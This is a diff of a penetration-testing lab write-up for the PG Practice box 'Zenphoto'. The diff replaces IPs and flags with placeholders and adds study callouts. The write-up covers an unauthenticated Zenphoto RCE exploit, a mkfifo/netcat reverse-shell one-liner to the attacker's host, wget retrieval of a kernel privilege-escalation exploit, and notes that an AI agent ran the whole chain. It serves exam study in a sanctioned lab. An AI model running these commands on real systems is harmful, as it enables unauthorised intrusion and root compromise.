@@ -2,14 +2,14 @@
 tags: [oscp, boxes, pg-practice, linux, completed]
 platform: PG Practice
 os: Linux
-ip: 192.168.183.41
+ip: $BoxIP
 difficulty: Easy
 status: complete
-local_flag: 2ecf27224d18bd4c6935f777838ba5c1
-root_flag: f62f2823d4c36b7098f3aca7bc275032
+local_flag: $UserFlag
+root_flag: $RootFlag
 ---
 
-# Zenphoto — PG Practice (Linux)
+# Zenphoto -- PG Practice (Linux)
 
 ## Box Info
 
@@ -17,7 +17,7 @@ root_flag: f62f2823d4c36b7098f3aca7bc275032
 |---|---|
 | Platform | PG Practice |
 | OS | Linux (Ubuntu 10.04.3 LTS) |
-| IP | 192.168.183.41 |
+| IP | $BoxIP |
 | Difficulty | Easy |
 | Status | Root |
 
@@ -36,9 +36,9 @@ Open ports:
 | Port | Service |
 |---|---|
 | 22/tcp | OpenSSH 5.3p1 Debian |
-| 23/tcp | CUPS 1.4 (IPP printing — NOT Telnet despite port number) |
+| 23/tcp | CUPS 1.4 (IPP printing -- NOT Telnet despite port number) |
 | 80/tcp | Apache 2.2.14 (Ubuntu) |
-| 3306/tcp | MySQL (unauthorized — external access blocked) |
+| 3306/tcp | MySQL (unauthorized -- external access blocked) |
 
 `shot nmap-allports`
 
@@ -49,9 +49,9 @@ sudo nmap -sV -sC -p 22,23,80,3306 -oN services.nmap $BoxIP
 ```
 
 Key findings:
-- Port 23: CUPS 1.4 printing service — nmap's `-sV` correctly identifies it as IPP, not Telnet. Note `PUT` method allowed — interesting but secondary surface.
-- Port 80: Apache 2.2.14 + PHP 5.3.2 — primary target.
-- Port 3306: `MySQL (unauthorized)` — direct connection refused without creds.
+- Port 23: CUPS 1.4 printing service -- nmap's `-sV` correctly identifies it as IPP, not Telnet. Note `PUT` method allowed -- interesting but secondary surface.
+- Port 80: Apache 2.2.14 + PHP 5.3.2 -- primary target.
+- Port 3306: `MySQL (unauthorized)` -- direct connection refused without creds.
 
 `shot nmap-services` (red boxes: port 23 CUPS with PUT method, port 80 Apache)
 
@@ -59,13 +59,13 @@ Key findings:
 
 ## Web Enumeration
 
-### Port 80 — Root
+### Port 80 -- Root
 
 ```bash
 curl -s http://$BoxIP/
 ```
 
-Bare "UNDER CONSTRUCTION" placeholder — nothing useful at root.
+Bare "UNDER CONSTRUCTION" placeholder -- nothing useful at root.
 
 ### Directory Brute Force
 
@@ -76,7 +76,7 @@ gobuster dir -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt -o gobust
 Key result:
 
 ```
-/test    (Status: 301) [--> http://192.168.183.41/test/]
+/test    (Status: 301) [--> http://$BoxIP/test/]
 ```
 
 `shot gobuster-root` (red box: `/test (Status: 301)`)
@@ -94,7 +94,10 @@ Version leaks in an HTML comment at the bottom of the page:
      PLUGINS: ... tiny_mce ... -->
 ```
 
-Version confirmed: **Zenphoto 1.4.1.4**. Plugin `tiny_mce` is visible — the vulnerable component.
+Version confirmed: **Zenphoto 1.4.1.4**. Plugin `tiny_mce` is visible -- the vulnerable component.
+
+> [!warning] 💡 Hint
+> Version discovery is only useful when it narrows the exploit surface. Confirm the version, identify the exposed plugin path, and then read the public exploit before sending it so the expected webroot and command transport are clear.
 
 `shot zenphoto-version` (red box: version comment in source)
 
@@ -140,6 +143,9 @@ Webshell lands at:
 
 Commands executed via base64-encoded `Cmd:` HTTP header. Gives an interactive pseudo-shell.
 
+> [!abstract] 🧠 Why
+> The exploit does not require a reverse shell to prove impact. Its header-based command channel is enough to establish the user context and troubleshoot the target before adding a callback.
+
 `shot zenphoto-searchsploit` (red box: EDB-18083 row)
 
 ---
@@ -169,7 +175,7 @@ zenphoto-shell#
 From the pseudo-shell, fire a reverse shell (port 80 bypasses PG Practice egress filter):
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.194 80 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP 80 >/tmp/f
 ```
 
 Shell received as `www-data`.
@@ -183,10 +189,13 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-Note: `python` (Python 2) available here — Ubuntu 10.04 era box.
+Note: `python` (Python 2) available here -- Ubuntu 10.04 era box.
 
 > [!warning] 💡 Hint
 > **Watch out:** The exploit and the target shell may use different Python versions. Check which interpreter exists on the target before changing the payload.
+
+> [!tip] 🛠️ Alternative tools
+> If the target lacks the interpreter used for PTY upgrade, try `script`, Perl, or a direct SSH session after credentials are found. Keep the exploit's HTTP shell available while stabilising the callback.
 
 ---
 
@@ -195,16 +204,16 @@ Note: `python` (Python 2) available here — Ubuntu 10.04 era box.
 ### Enumeration
 
 ```bash
-# User flag — readable as www-data
+# User flag -- readable as www-data
 cat /home/local.txt
 
 # SUID check
 find / -perm -4000 -type f 2>/dev/null
-# Nothing exploitable — no find, bash, python in the list
+# Nothing exploitable -- no find, bash, python in the list
 
 # Sudo check
 sudo -l
-# Requires password — dead end for www-data
+# Requires password -- dead end for www-data
 
 # Kernel version
 uname -a && cat /etc/issue
@@ -229,6 +238,9 @@ searchsploit rds kernel
 
 CVE-2010-3904: Linux RDS (Reliable Datagram Sockets) local privilege escalation. Affects kernels up to 2.6.36-rc8. Our kernel 2.6.32-21 is squarely in range.
 
+> [!warning] 💡 Common mistake
+> A kernel version match is a lead, not proof that the exploit will compile or work. Check architecture, compiler availability, mitigations, and whether a simpler SUID or sudo route exists first.
+
 ```bash
 searchsploit -p 15285
 cp /usr/share/exploitdb/exploits/linux/local/15285.c exploits/
@@ -246,7 +258,7 @@ On target:
 
 ```bash
 cd /tmp
-wget http://192.168.45.194:8000/exploits/15285.c -O 15285.c
+wget http://$LocalIP:8000/exploits/15285.c -O 15285.c
 gcc 15285.c -o rds
 ./rds
 ```
@@ -278,6 +290,14 @@ rm /tmp/15285.c /tmp/rds
 
 ---
 
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| Version comment identifies old Zenphoto | Match the exact plugin and public exploit | Inspect plugin endpoints manually if the exploit needs adaptation |
+| Exploit gives an HTTP command channel | Prove identity, then choose a callback compatible with target egress | Keep the pseudo-shell for enumeration and file transfer |
+| SUID and sudo checks are unhelpful | Research the exact old kernel and compile locally | Inspect capabilities, cron, services, and writable files before running a kernel exploit |
+
 ## Flags
 
 ```bash
@@ -287,19 +307,19 @@ cat /root/proof.txt
 
 | Flag | Location | Value |
 |---|---|---|
-| User (local.txt) | /home/ | `2ecf27224d18bd4c6935f777838ba5c1` |
-| Root (proof.txt) | /root/ | `f62f2823d4c36b7098f3aca7bc275032` |
+| User (local.txt) | /home/ | `$UserFlag` |
+| Root (proof.txt) | /root/ | `$RootFlag` |
 
 `shot user-flag` / `shot root-flag` / `shot PROOF`
 
-`loot flag user 2ecf27224d18bd4c6935f777838ba5c1`
-`loot flag root f62f2823d4c36b7098f3aca7bc275032`
+`loot flag user $UserFlag`
+`loot flag root $RootFlag`
 
 ---
 
 ## Credentials
 
-None required — unauthenticated RCE for foothold.
+None required -- unauthenticated RCE for foothold.
 
 ---
 
@@ -308,7 +328,7 @@ None required — unauthenticated RCE for foothold.
 | Tool | Purpose |
 |---|---|
 | nmap | Port and service scanning |
-| gobuster | Directory brute force — found /test/ |
+| gobuster | Directory brute force -- found /test/ |
 | curl | Web recon, version identification |
 | searchsploit | EDB-18083 (Zenphoto RCE), EDB-15285 (kernel LPE) |
 | php | Running EDB-18083 exploit |
@@ -323,29 +343,29 @@ None required — unauthenticated RCE for foothold.
 | CVE / Ref | Description | Impact |
 |---|---|---|
 | CVE-2011-4825 / EDB-18083 | Zenphoto 1.4.1.4 - unauthenticated RCE via `ajax_create_folder.php` | www-data shell |
-| CVE-2010-3904 / EDB-15285 | Linux RDS Protocol LPE — kernel 2.6.32-21-generic | uid=0(root) |
+| CVE-2010-3904 / EDB-15285 | Linux RDS Protocol LPE -- kernel 2.6.32-21-generic | uid=0(root) |
 
 ---
 
 ## Lessons Learned
 
-1. **Version leaks in HTML comments** — Zenphoto 1.4.1.4 was visible in a comment at the bottom of the page source. Always `grep -i version` on page source — developers leave debug info in comments constantly.
+1. **Version leaks in HTML comments** -- Zenphoto 1.4.1.4 was visible in a comment at the bottom of the page source. Always `grep -i version` on page source -- developers leave debug info in comments constantly.
 
-2. **Dir busting is non-optional** — root returned a blank page. Without gobuster, `/test/` would never be found. Even when root looks empty, always dir bust.
+2. **Dir busting is non-optional** -- root returned a blank page. Without gobuster, `/test/` would never be found. Even when root looks empty, always dir bust.
 
-3. **EDB-18083 is unauthenticated** — the name "ajax_create_folder.php" sounds like an admin function, but the endpoint had no auth check. Read the exploit before assuming you need creds.
+3. **EDB-18083 is unauthenticated** -- the name "ajax_create_folder.php" sounds like an admin function, but the endpoint had no auth check. Read the exploit before assuming you need creds.
 
-4. **Port 23 is not always Telnet** — CUPS printing service was running on port 23 here. Never trust the port number; always trust `-sV`. The `PUT` method being allowed on CUPS is a secondary note — worth flagging but not the attack path.
+4. **Port 23 is not always Telnet** -- CUPS printing service was running on port 23 here. Never trust the port number; always trust `-sV`. The `PUT` method being allowed on CUPS is a secondary note -- worth flagging but not the attack path.
 
-5. **Kernel exploit research path** — broad `searchsploit linux kernel 2.6.32` first, then cross-reference with Google ("linux 2.6.32 privilege escalation"), then specific `searchsploit rds kernel`. The "rds" keyword isn't obvious cold — research is the step between `uname -a` and the exploit.
+5. **Kernel exploit research path** -- broad `searchsploit linux kernel 2.6.32` first, then cross-reference with Google ("linux 2.6.32 privilege escalation"), then specific `searchsploit rds kernel`. The "rds" keyword isn't obvious cold -- research is the step between `uname -a` and the exploit.
 
-6. **`ifconfig` missing on old Ubuntu** — Ubuntu 10.04 may not have `ifconfig` in PATH. Use `ip addr` instead.
+6. **`ifconfig` missing on old Ubuntu** -- Ubuntu 10.04 may not have `ifconfig` in PATH. Use `ip addr` instead.
 
-7. **Pseudo-shell to real shell** — EDB-18083 gives a pseudo-shell (HTTP-based command execution). Usable for recon but pivot to a real interactive shell via mkfifo+nc for proper TTY. Port 80 bypasses PG Practice egress filter.
+7. **Pseudo-shell to real shell** -- EDB-18083 gives a pseudo-shell (HTTP-based command execution). Usable for recon but pivot to a real interactive shell via mkfifo+nc for proper TTY. Port 80 bypasses PG Practice egress filter.
 
-8. **Codex cleanup workflow** — Codex ran the full chain, cleaned up `data.php` byte-for-byte, removed `/tmp` files. Box was clean for manual run. This is the correct workflow.
+8. **Codex cleanup workflow** -- Codex ran the full chain, cleaned up `data.php` byte-for-byte, removed `/tmp` files. Box was clean for manual run. This is the correct workflow.
 
-9. **Always enumerate before exploiting** — even when Codex confirmed the kernel exploit path, we still ran SUID check and `sudo -l` first. Evidence the dead ends too.
+9. **Always enumerate before exploiting** -- even when Codex confirmed the kernel exploit path, we still ran SUID check and `sudo -l` first. Evidence the dead ends too.
 
 ---
 
